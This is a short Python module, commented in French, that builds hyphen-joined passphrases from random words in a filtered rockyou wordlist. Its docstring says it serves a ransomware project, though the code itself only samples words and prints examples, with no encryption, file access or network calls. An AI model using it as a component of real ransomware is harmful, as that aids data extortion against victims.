"""
Génération de mots de passe aléatoires pour le ransomware
Utilise la wordlist rockyou_filtered.txt (mots filtrés : 4-12 caractères, alphanumériques)
"""

import secrets
from pathlib import Path

# Chemin vers rockyou_filtered.txt
ROCKYOU_PATH = Path(__file__).parent / "rockyou_filtered.txt"

# Cache de mots chargés depuis rockyou_filtered.txt
_WORD_CACHE = None
_CACHE_SIZE = 50000  # Nombre de mots à charger en cache


def _load_rockyou_words():
    """
    Charge un échantillon aléatoire de mots depuis rockyou_filtered.txt

    Returns:
        Liste de mots valides
    """
    global _WORD_CACHE

    if _WORD_CACHE is not None:
        return _WORD_CACHE

    if not ROCKYOU_PATH.exists():
        raise FileNotFoundError(
            f"rockyou_filtered.txt introuvable à {ROCKYOU_PATH}. "
            "Veuillez vous assurer que le fichier est présent dans le répertoire src/"
        )

    print(f"[WORDLIST] Chargement de {_CACHE_SIZE} mots depuis rockyou_filtered.txt...")

    # Lit tous les mots (déjà filtrés)
    with open(ROCKYOU_PATH, 'r', encoding='utf-8') as f:
        all_words = [line.strip() for line in f if line.strip()]

    # Sélectionne aléatoirement CACHE_SIZE mots
    if len(all_words) > _CACHE_SIZE:
        words = secrets.SystemRandom().sample(all_words, _CACHE_SIZE)
    else:
        words = all_words

    _WORD_CACHE = words
    print(f"[WORDLIST] {len(words)} mots chargés en cache (sur {len(all_words):,} disponibles)")

    return words


def generate_random_password(num_words: int = 4, separator: str = "-") -> str:
    """
    Génère un mot de passe aléatoire composé de mots de rockyou_filtered.txt

    Args:
        num_words: Nombre de mots à utiliser (défaut: 4)
        separator: Séparateur entre les mots (défaut: "-")

    Returns:
        Mot de passe généré (ex: "dragon-shadow-matrix-secret")

    Note:
        Utilise rockyou_filtered.txt qui contient ~12.5M mots filtrés
        (4-12 caractères, alphanumériques uniquement)
    """
    word_list = _load_rockyou_words()
    words = [secrets.choice(word_list) for _ in range(num_words)]
    password = separator.join(words)
    return password


if __name__ == "__main__":
    # Test de génération de mots de passe
    print("Exemples de mots de passe générés:")
    for i in range(5):
        print(f"  {i+1}. {generate_random_password()}")
